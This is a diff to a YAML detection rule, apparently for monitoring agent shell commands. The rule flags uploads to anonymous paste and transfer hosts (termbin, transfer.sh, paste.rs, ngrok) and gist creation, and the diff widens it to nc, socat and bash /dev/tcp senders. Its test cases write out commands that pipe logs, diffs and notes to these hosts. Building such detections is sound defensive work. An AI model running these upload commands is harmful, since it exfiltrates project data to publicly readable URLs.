@@ -1,14 +1,20 @@
 id: upload-to-paste-transfer-site
-version: 2
+spec: threat-rules/v1.2  # needed for e.command.parsed_commands
+version: 3
 title: Upload to an anonymous paste/transfer/tunnel host or a gist
 description: >
   A command POSTs or uploads file content to a well-known anonymous file-drop,
   paste, or ad-hoc tunnel service (transfer.sh, 0x0.st, file.io, pastebin.com,
-  ngrok, bashupload, termbin, gofile, catbox, oshi.at). These hosts are common
-  exfiltration channels because they accept anonymous uploads to attacker-readable
-  URLs and bypass curl-to-arbitrary-host heuristics by targeting a "legitimate"
-  domain. Hostname-only allowlists do not stop this, since the destination is an
-  otherwise-allowed domain.
+  ngrok, bashupload, termbin, gofile, catbox, oshi.at), or creates a gist. These
+  hosts are common exfiltration channels because they accept anonymous uploads to
+  attacker-readable URLs and bypass curl-to-arbitrary-host heuristics by targeting a
+  "legitimate" domain. Hostname-only allowlists do not stop this, since the
+  destination is an otherwise-allowed domain. The sender is any network client the
+  egress rules share (curl, wget, httpie, xh, nc, ncat, netcat, socat, by any path,
+  under sudo, timeout or torsocks, or inside bash -c) given one of these hosts as an
+  argument, or a bash /dev/tcp redirect to one. The command line is read as bash, so
+  the same text inside a commit message, an echo or a grep pattern does not fire; a
+  command line that does not parse falls back to matching its text.
 severity: high
 status: stable
 posture: detect
@@ -17,14 +23,24 @@ taxonomy:
   owasp_llm: LLM06
   mitre_atlas: AML.T0024
 
+# The sender check (s) and the /dev/tcp check are the egress rules' shared definition;
+# TestPackSharedEgressSender keeps every copy identical.
 match: >
-  (
-    e.event.action == "command.executed" &&
-    e.command.command.matches("(?i)\\b(curl|wget|http|httpie)\\b") &&
-    e.command.command.matches("(?i)\\b(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)\\b")
-  ) || (
-    e.event.action == "command.executed" &&
-    e.command.command.matches("(?i)\\bgh\\s+gist\\s+create\\b")
+  e.event.action == "command.executed" && (
+    e.command.parsed_commands.exists(s,
+      (s.name.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$") ||
+        s.name.matches("(?i)^(timeout|nice|ionice|stdbuf|doas|torsocks|proxychains4?)$") &&
+        s.argv.exists(a, a.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$"))) &&
+      s.argv_raw.exists(a, a.matches("(?i)(^|[/@.:=\\x27\"])(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)([/:,?\\x27\"]|$)")) ||
+      s.name == "gh" && s.argv.exists(a, a == "gist") && s.argv.exists(a, a == "create")) ||
+    (e.command.command.matches("[<>][&|]?\\s*/dev/(tcp|udp)/") &&
+      !e.command.parsed_commands.exists(w, !w.name.matches("(?i)^(ba|z|da|k)?sh$") &&
+        w.argv_raw.exists(a, a.matches("/dev/(tcp|udp)/")))) &&
+      e.command.command.matches("(?i)/dev/(tcp|udp)/(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)/") ||
+    (size(e.command.parsed_commands) == 0 && (
+      e.command.command.matches("(?i)\\b(curl|wget|http|httpie)\\b") &&
+        e.command.command.matches("(?i)\\b(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)\\b") ||
+      e.command.command.matches("(?i)\\bgh\\s+gist\\s+create\\b")))
   )
 emit:
   reason: "Outbound upload to an anonymous paste/transfer/tunnel host"
@@ -71,4 +87,92 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "gh gist list" }
+        session: { id: s1 }
+  - name: nc_termbin_build_log
+    # termbin only takes uploads over a raw socket; the payload is not a secret, so no
+    # credential rule covers it.
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cat build.log | nc termbin.com 9999" }
+        session: { id: s1 }
+  - name: ncat_termbin
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git diff | ncat termbin.com 9999" }
+        session: { id: s1 }
+  - name: sudo_absolute_path_netcat_termbin
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "tail -n 200 app.log | sudo /usr/bin/netcat -q1 termbin.com 9999" }
+        session: { id: s1 }
+  - name: socat_termbin
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cat notes.txt | socat - TCP:termbin.com:9999" }
+        session: { id: s1 }
+  - name: timeout_nc_termbin
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cat build.log | timeout 5 nc termbin.com 9999" }
+        session: { id: s1 }
+  - name: nc_termbin_in_bash_c
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "bash -c 'cat build.log | nc termbin.com 9999'" }
+        session: { id: s1 }
+  - name: dev_tcp_termbin
+    # The pure-bash upload termbin documents.
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "(exec 3<>/dev/tcp/termbin.com/9999; cat notes.txt >&3; cat <&3)" }
+        session: { id: s1 }
+  - name: httpie_paste_rs
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "http POST https://paste.rs @notes.txt" }
+        session: { id: s1 }
+  - name: nc_ordinary_host
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "nc -z localhost 5432" }
+        session: { id: s1 }
+  - name: commit_message_mentions_nc_and_termbin
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m \"docs: termbin.com takes uploads over nc\"" }
+        session: { id: s1 }
+  - name: grep_nc_then_echo_paste_host
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "grep -rn nc src && echo see pastebin.com" }
+        session: { id: s1 }
+  - name: echo_dev_tcp_termbin
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "echo 'upload with: cat f > /dev/tcp/termbin.com/9999'" }
+        session: { id: s1 }
+  - name: heredoc_body_mentions_curl_and_host
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cat > NOTES.md <<'EOF'\ncurl -T x https://transfer.sh/x\nEOF" }
+        session: { id: s1 }
+  - name: open_paste_url
+    # The old text check took the "http" of a URL for httpie.
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "open http://termbin.com/abcd" }
         session: { id: s1 }
